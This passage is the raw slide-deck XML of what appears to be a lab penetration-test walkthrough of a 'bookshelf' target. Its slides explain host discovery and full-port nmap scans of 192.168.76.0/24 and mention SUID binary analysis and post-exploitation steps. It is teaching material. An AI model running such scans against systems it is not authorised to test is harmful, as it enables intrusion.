          <a:xfrm>
            <a:off x="8211312" y="3520440"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Binary analysis of the SUID .shelf file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Text 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="3721608"/>
            <a:ext cx="3346704" cy="201168"/>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Post-Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="3941064"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="4014216"/>
            <a:ext cx="3346704" cy="27432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ps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="4270248"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Process enumeration on the compromised host</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Text 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="4471416"/>
            <a:ext cx="3346704" cy="201168"/>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Post-Exploit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5</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02 · RECONNAISSANCE</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Network Discovery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5212080" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1508760"/>
            <a:ext cx="4882896" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ ip -br addr</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ ip route</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2331720"/>
            <a:ext cx="5212080" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2423160"/>
            <a:ext cx="4882896" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ sudo nmap -sn 192.168.76.0/24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3063240"/>
            <a:ext cx="5212080" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WHAT THIS DOES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3264408"/>
            <a:ext cx="5212080" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ip shows our own interfaces/addresses; nmap -sn performs host discovery only — no port scan — across the whole subnet.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3977640"/>
            <a:ext cx="5212080" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CONCEPT: CIDR /24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4178808"/>
            <a:ext cx="5212080" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/24 means the first 24 bits of the address are fixed (the network), leaving the last 8 bits (0-255) to scan — 256 possible hosts on 192.168.76.0/24.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1417320"/>
            <a:ext cx="5577840" cy="3383280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2162"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="1600200"/>
            <a:ext cx="5029200" cy="274320"/>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RESULT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="1920240"/>
            <a:ext cx="5029200" cy="210312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300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5 hosts up on the segment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.76.157 — the target (confirmed by MAC vendor + later port scan)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.76.128 — our own attacker host</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.76.1 / .2 / .254 — lab gateway / infrastructure addresses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="4069080"/>
            <a:ext cx="5029200" cy="274320"/>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NEXT DECISION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="4343400"/>
            <a:ext cx="5029200" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Target is live and reachable — proceed to a full TCP port scan against 192.168.76.157.</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6</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02 · RECONNAISSANCE</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Full Port Scanning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="11064240" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1508760"/>
            <a:ext cx="10735056" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ sudo nmap -Pn -p- --min-rate 2000 -oA bookshelf_allports 192.168.76.157</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2423160"/>
            <a:ext cx="1920240" cy="36576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-Pn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2514600" y="2423160"/>
            <a:ext cx="5486400" cy="365760"/>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Skip host-discovery probe — treat the host as up (we already confirmed it is).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2843784"/>
            <a:ext cx="1920240" cy="36576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-p-</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2514600" y="2843784"/>
            <a:ext cx="5486400" cy="365760"/>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Scan all 65,535 TCP ports, not just the default top 1,000.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3264408"/>
            <a:ext cx="1920240" cy="36576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--min-rate 2000</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2514600" y="3264408"/>
            <a:ext cx="5486400" cy="365760"/>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Send at least 2,000 packets/second to keep a full-port scan fast.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3685032"/>
            <a:ext cx="1920240" cy="36576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-oA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2514600" y="3685032"/>
            <a:ext cx="5486400" cy="365760"/>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Save output in all three formats (normal, XML, grepable) for later reference.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="2331720"/>
            <a:ext cx="3337560" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3404"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8503920" y="2487168"/>
            <a:ext cx="2926080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OPEN PORTS FOUND</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8503920" y="2761488"/>
            <a:ext cx="2926080" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>21 — FTP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
